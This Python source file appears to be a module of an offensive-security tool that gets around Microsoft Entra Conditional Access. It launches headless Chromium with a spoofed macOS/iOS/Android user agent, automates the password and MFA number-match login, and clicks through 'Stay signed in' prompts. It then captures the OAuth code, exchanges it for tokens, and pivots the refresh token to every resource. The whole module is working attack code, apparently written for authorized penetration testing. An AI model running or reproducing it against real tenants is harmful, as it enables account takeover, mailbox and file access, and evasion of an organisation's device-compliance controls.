"""Module 4: Platform CA bypass via Selenium (the confirmed exploit path).

Launches headless Chromium with a macOS/iOS/Android Safari UA, drives the v2.0 authorize
+ PKCE flow through username/password/MFA/KMSI, captures the auth code, exchanges it, then
pivots the refresh token to every resource.

Why it works (gotchas #7, #12):
 - Selenium is a real browser -> defeats 501314 (browser-capability detection).
 - macOS/iOS/Android UA is not in the Windows/Linux/ChromeOS device-compliance enforcement
   list -> 53003 becomes 50076 (MFA only).
"""
import base64
import hashlib
import os
import secrets
import time

import requests

from lib import clients, ua as ua_lib
from lib.logger import logged_session, get as get_log
from lib.oauth import exchange_code_v2, refresh_v2
from lib.util import decode_jwt, extract_code, now_iso, write_mfa_number
from modules.token_ops import store_token

NATIVE_REDIRECT = clients.NATIVE_REDIRECT
OFFICE = clients.CLIENTS["office"]


def _pkce():
    verifier = base64.urlsafe_b64encode(secrets.token_bytes(32)).decode().rstrip("=")
    challenge = base64.urlsafe_b64encode(hashlib.sha256(verifier.encode()).digest()).decode().rstrip("=")
    return verifier, challenge


def _auth_url(tenant, challenge, username):
    return (
        f"https://login.microsoftonline.com/{tenant}/oauth2/v2.0/authorize?"
        f"client_id={OFFICE}&response_type=code&redirect_uri={NATIVE_REDIRECT}"
        f"&scope=User.Read+Mail.Read+Files.Read.All+offline_access"
        f"&code_challenge={challenge}&code_challenge_method=S256"
        f"&login_hint={username}&response_mode=query"
    )


def _driver(cfg, ua_str):
    import shutil
    from selenium import webdriver
    from selenium.webdriver.chrome.options import Options
    from selenium.webdriver.chrome.service import Service

    opts = Options()
    if cfg.headless:
        opts.add_argument("--headless=new")
    opts.add_argument("--no-sandbox")
    opts.add_argument("--disable-dev-shm-usage")
    opts.add_argument("--disable-gpu")
    opts.add_argument(f"--user-agent={ua_str}")
    if cfg.chromium_path:
        opts.binary_location = cfg.chromium_path
    # Prefer a system chromedriver on PATH (Selenium Manager can't fetch one offline).
    driver_path = shutil.which("chromedriver")
    service = Service(executable_path=driver_path) if driver_path else None
    d = webdriver.Chrome(options=opts, service=service)
    d.set_page_load_timeout(30)
    return d


def _code_in_url(url):
    if "code=" in url:
        return url.split("code=")[1].split("&")[0]
    return None


def _extract_mfa_number(driver, eng=None, platform=""):
    """Find the number-match value on the login page. Saves the page HTML/screenshot so a failed
    extraction is never silent (the operator can read the number off the saved screenshot)."""
    import re
    page = driver.page_source
    if eng:
        eng.save_evidence(f"bypass_{platform}_mfa_page.html", page)
        try:
            driver.save_screenshot(os.path.join(eng.evidence, f"bypass_{platform}_mfa_page.png"))
        except Exception:
            pass
    # JSON/attribute patterns (digits only).
    for pat in (r'"displaySign"\s*:\s*"?(\d{1,3})"?', r'"entropy"\s*:\s*"?(\d{1,3})"?',
                r'"Entropy"\s*:\s*(\d{1,3})', r'data-value="(\d{1,3})"',
                r'class="[^"]*display-sign[^"]*"[^>]*>\s*(\d{1,3})'):
        m = re.search(pat, page, re.IGNORECASE)
        if m:
            return m.group(1)
    # Element-text scan: the number renders as a short standalone 1-3 digit string.
    try:
        from selenium.webdriver.common.by import By
        for sel in ("[class*='displaySign']", "[class*='display-sign']", ".text-title",
                    "[role='heading']", "div[aria-live]"):
            for el in driver.find_elements(By.CSS_SELECTOR, sel):
                t = (el.text or "").strip()
                if t.isdigit() and 1 <= len(t) <= 3:
                    return t
    except Exception:
        pass
    return None


def run(cfg, eng, args):
    platform = getattr(args, "method", "selenium-macos").replace("selenium-", "")
    ua_str = ua_lib.get(platform)
    print(f"[bypass] Selenium platform bypass via {platform} UA")
    if not cfg.password:
        raise SystemExit("[bypass] Password required in config.")

    from selenium.webdriver.common.by import By
    from selenium.webdriver.support import expected_conditions as EC
    from selenium.webdriver.support.ui import WebDriverWait

    verifier, challenge = _pkce()
    driver = _driver(cfg, ua_str)
    code = None
    try:
        driver.get(_auth_url(cfg.tenant_id, challenge, cfg.username))
        time.sleep(3)
        code = _code_in_url(driver.current_url)

        if not code:
            if any(c in driver.page_source for c in ("530003", "53003", "530084")):
                eng.save_evidence(f"bypass_{platform}_53003.html", driver.page_source)
                raise SystemExit(f"[bypass] CA block with {platform} UA at the authorize page. No bypass here.")

            # Username page may precede password (login_hint not always honored).
            try:
                pw = WebDriverWait(driver, 10).until(
                    EC.presence_of_element_located((By.CSS_SELECTOR, "input[type='password']")))
            except Exception:
                u = driver.find_element(By.CSS_SELECTOR, "input[type='email'], input[name='loginfmt']")
                u.clear(); u.send_keys(cfg.username)
                driver.find_element(By.CSS_SELECTOR, "input[type='submit'], button[type='submit']").click()
                time.sleep(3)
                pw = WebDriverWait(driver, 10).until(
                    EC.presence_of_element_located((By.CSS_SELECTOR, "input[type='password']")))

            pw.clear(); pw.send_keys(cfg.password)
            try:
                driver.find_element(By.CSS_SELECTOR, "input[type='submit'], button[type='submit']").click()
            except Exception:
                pw.send_keys("\n")
            time.sleep(5)

            code = _code_in_url(driver.current_url) or extract_code(driver.page_source)
            page = driver.page_source
            if not code and any(c in page for c in ("530003", "53003", "530084")):
                eng.save_evidence(f"bypass_{platform}_after_login.html", page)
                raise SystemExit("[bypass] CA block (53003/530003) after password. No bypass for this resource.")

            if not code and ("50076" in page or "proofup" in page.lower() or "PhoneAppNotification" in page):
                print("[bypass] MFA page (50076 - MFA only, no device compliance).")
                time.sleep(3)
                number = _extract_mfa_number(driver, eng, platform)
                if number:
                    write_mfa_number(number, cfg.mfa_number_file)
                else:
                    print("[bypass] MFA number not visible yet; approve the prompt on your device.")
                code = _poll_for_code(driver, By, cfg.mfa_timeout, eng)

        if not code:
            eng.save_evidence(f"bypass_{platform}_unknown.html", driver.page_source)
            raise SystemExit("[bypass] No auth code obtained. Page saved to evidence.")
    finally:
        driver.quit()

    log = get_log()
    log.info(f"[bypass] Auth code captured. Exchanging for tokens (PKCE)...")
    status, tok = exchange_code_v2(logged_session("selenium-exchange"), cfg.tenant_id, OFFICE, code,
                                   NATIVE_REDIRECT, verifier, ua=ua_str)
    if "access_token" not in tok:
        raise SystemExit(f"[bypass] Token exchange failed: {tok.get('error_description', tok)[:200]}")

    saved = store_token(eng, "graph", tok, cfg, source="gatecrash",
                        meta={"platform": platform, "method": "selenium"})
    claims = decode_jwt(tok["access_token"])
    log.info(f"[bypass] GOT GRAPH TOKEN:")
    log.info(f"[bypass]   Audience:  {claims.get('aud')}")
    log.info(f"[bypass]   UPN:       {claims.get('upn')}")
    log.info(f"[bypass]   DeviceID:  {claims.get('deviceid', 'NONE')}")
    log.info(f"[bypass]   AMR:       {claims.get('amr')}")
    log.info(f"[bypass]   Scopes:    {claims.get('scp', 'N/A')}")
    log.info(f"[bypass]   Saved to:  {saved}")

    _pivot(cfg, eng, tok.get("refresh_token"), ua_str)
    return {"graph_token": saved}


def _poll_for_code(driver, By, timeout, eng=None):
    """Poll for the auth code, clearing post-MFA interstitials (KMSI 'Stay signed in?', etc.)."""
    print(f"[bypass] Waiting for MFA approval ({timeout}s)...", flush=True)
    last_url = ""
    for i in range(max(1, timeout // 5)):
        time.sleep(5)
        url = driver.current_url
        src = driver.page_source
        # Proven pattern (wait_mfa.py): auth code sits in ProcessAuth HTML as name="code" value=...
        code = _code_in_url(url) or extract_code(src)
        if code:
            print("[bypass] MFA approved, auth code captured.", flush=True)
            return code
        page = src.lower()
        ca = next((c for c in ("530003", "53003", "530084") if c in page), None)
        if ca:
            print(f"[bypass] CA block ({ca}) after MFA: the authorize flow re-applied Conditional "
                  f"Access for this resource. Platform UA bypass does NOT carry to an interactive "
                  f"token on this tenant (gotcha #7).", flush=True)
            if eng:
                eng.save_evidence(f"bypass_post_mfa_{ca}.html", driver.page_source)
            return None
        # Clear KMSI / "Stay signed in?" and any primary-submit interstitial.
        if _click_interstitial(driver, By, page):
            time.sleep(3)
            code = _code_in_url(driver.current_url) or extract_code(driver.page_source)
            if code:
                print("[bypass] Interstitial cleared, auth code captured.", flush=True)
                return code
        # Note: do NOT blindly submit the ProcessAuth form -- it is a Knockout auto-submit form
        # that binds ctx/flowToken at submit time; a raw submit sends empty values (50074 loop).
        # Let the page's own JS drive the MFA poll; we just watch for the code.
        if eng and "processauth" in url.lower() and not getattr(_poll_for_code, "_dumped", False):
            eng.save_evidence("bypass_processauth.html", src)
            _poll_for_code._dumped = True
        if url != last_url:
            print(f"[bypass]   ...at {url.split('?')[0][:80]}", flush=True)
            last_url = url
    print("[bypass] Timed out waiting for auth code.", flush=True)
    if eng:
        eng.save_evidence("bypass_poll_timeout.html", driver.page_source)
    return None


INTERSTITIAL_MARKERS = ("kmsi", "stay signed in", "reduce the number of times",
                        "don't show this again", "protect your account", "skip for now",
                        "keep your account secure")


def _click_interstitial(driver, By, page_lower):
    """Click through a recognized post-MFA interstitial (KMSI etc.). Returns True if clicked.

    Gated on known interstitial text so we never click during the pending-approval page.
    """
    if not any(m in page_lower for m in INTERSTITIAL_MARKERS):
        return False
    for how, sel in [(By.ID, "idSIButton9"),   # "Yes"/"Next" primary submit (KMSI, proofup)
                     (By.ID, "idBtn_Back"),     # "No"/"Skip"
                     (By.CSS_SELECTOR, "input[type='submit']")]:
        try:
            el = driver.find_element(how, sel)
            if el.is_displayed() and el.is_enabled():
                el.click()
                print("[bypass]   cleared an interstitial page.", flush=True)
                return True
        except Exception:
            continue
    return False


def _pivot(cfg, eng, refresh_token, ua_str):
    """Pivot the refresh token to every resource (v2.0 scopes)."""
    log = get_log()
    if not refresh_token:
        log.info("[bypass] No refresh token; skipping pivot.")
        return
    log.info(f"[bypass] Pivoting refresh token to {len(clients.PIVOT_SCOPES)} resources...")
    session = logged_session("selenium-pivot")
    for name in clients.PIVOT_SCOPES:
        scope = clients.v2_scope(name, cfg.sharepoint_host)
        status, tok = refresh_v2(session, cfg.tenant_id, OFFICE, refresh_token, scope, ua=ua_str)
        if "access_token" in tok:
            store_token(eng, name, tok, cfg, source="gatecrash", meta={"pivot_from": "graph"})
            claims = decode_jwt(tok["access_token"])
            print(f"  {name}: TOKEN (aud={claims.get('aud')})")
        else:
            print(f"  {name}: {status} {tok.get('error', '')}")
